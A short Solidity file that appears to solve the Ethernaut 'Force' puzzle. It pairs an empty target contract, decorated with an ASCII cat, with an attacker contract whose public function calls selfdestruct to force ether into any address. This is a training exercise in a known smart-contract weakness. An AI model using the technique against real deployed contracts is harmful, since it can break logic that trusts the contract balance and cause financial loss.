// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Force1 {
    function ForceTest(address payable force) public {
        selfdestruct(force);
    }

    receive() external payable {}
}